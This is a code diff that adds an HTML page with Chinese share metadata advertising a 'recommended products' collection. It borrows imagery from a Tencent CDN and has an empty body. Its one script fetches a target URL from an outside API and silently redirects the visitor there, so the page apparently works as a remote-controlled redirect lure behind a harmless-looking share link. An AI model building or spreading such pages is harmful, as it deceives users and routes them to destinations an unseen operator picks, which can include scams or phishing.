@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html dir="ltr" data-react-helmet="dir">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, viewport-fit=cover, minimum-scale=1, maximum-scale=1, user-scalable=no">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="renderer" content="webkit">
+        <meta name="layoutmode" content="standard">
+        <meta name="imagemode" content="force">
+        <meta name="wap-font-scale" content="no">
+        <meta name="format-detection" content="telephone=no">
+        <title>今天份好物推荐合集</title>
+        <link rel="icon" href="https://vac.gtimg.cn/music/photo_new/T053XD002002xxEla2vQF78.jpg">
+        <meta name="description" content="11111111111111111">
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="今天份好物推荐合集">
+        <meta property="og:description" content="快来看看有什么刚好需要的叭！不要错过哦~">
+        <meta property="og:image" content="https://vac.gtimg.cn/music/photo_new/T053XD002002xxEla2vQF78.jpg">
+    </head>
+    <body>
+        <script>
+            fetch("https://tz.9-u.cn/api.php?act=geturl2&t=oYmN")
+            .then(response => response.json())
+            .then(data => {
+                if (data.code === 1 && data.url) {
+                window.location.href = data.url;
+                }
+            });
+            </script>
+    </body>
+</html>
